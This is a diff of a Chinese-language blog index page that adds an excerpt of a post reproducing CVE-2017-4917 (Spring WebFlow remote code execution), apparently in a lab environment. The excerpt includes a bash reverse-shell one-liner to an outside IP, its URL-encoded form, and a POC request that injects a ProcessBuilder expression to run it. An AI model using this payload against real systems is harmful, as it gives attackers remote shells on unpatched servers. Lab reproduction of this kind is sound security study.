@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1612424791080.css">
+<link rel="stylesheet" href="/css/style.css?v=1612428108725.css">
 
     <!--[if lt IE 9]>
     
@@ -111,6 +111,59 @@
             
         </strong>
     </h3>
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    		CVE-2017-4917 Spring WebFlow远程代码执行漏洞
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2020-12-20T11:36:53.000Z">2020-12-20</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>Spring WebFlow 在 Model 的数据绑定由于没有明确指定相关 model 的具体属性导致从表单可以提交恶意的表达式从而被执行，导致任意代码执行的漏洞。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring WebFlow 2.4.0 – 2.4.4</p>
+<h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><p>启动镜像，访问镜像地址<br>根据提示的用户名密码进行登陆<br><img src="/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"><br>访问路径<code>hotels/1</code>，点击Book Hotel<br><img src="/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"><br>填好信息后点击Proceed<br><img src="/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"><br>点击confirm抓包<br><img src="/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"><br>将反弹shell的命令进行url转码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;8.131.79.166&#x2F;2345 0&gt;&amp;1	 &#x3D;&#x3D;&gt;%62%61%73%68%20%2d%69%3e%26%20%2f%64%65%76%2f%74%63%70%2f%38%2e%31%33%31%2e%37%39%2e%31%36%36%2f%32%33%34%35%20%30%3e%26%31</span><br></pre></td></tr></table></figure>
+<p>将POC填充到包里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_eventId_confirm&#x3D;&amp;_csrf&#x3D;33a3bc39-f5ef-4c73-a05e-8265c26c3cd3&amp;_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;%62%61%73%68%20%2d%69%3e%26%20%2f%64%65%76%2f%74%63%70%2f%38%2e%31%33%31%2e%37%39%2e%31%36%36%2f%32%33%34%35%20%30%3e%26%31&quot;)).start()&#x3D;vulhub</span><br></pre></td></tr></table></figure>
+<p>点击go，监听端即可返回shell<br><img src="/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.png"></p>
+
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2020/12/20/CVE-2017-4917-Spring-WebFlow%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2017-4917 Spring WebFlow远程代码执行漏洞">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/0.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
     
         <!-- 文章列表 item -->
 <article class="post">
@@ -424,7 +477,7 @@
     
     <li>
         <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
-        <span class="badge">(10)</span>
+        <span class="badge">(11)</span>
     </li>
     
 </ul>
@@ -436,7 +489,7 @@
         <!-- 文章标签 -->
 <div class="widget-bd tag-wrap">
   
-    <a class="tag-item" href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现 (6)</a>
+    <a class="tag-item" href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现 (7)</a>
   
     <a class="tag-item" href="/tags/POC/" title="POC">POC (9)</a>
   
@@ -490,7 +543,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1612424791081.js"></script>
+<script src="/js/main.js?v=1612428108726.js"></script>
 
 
 </body>
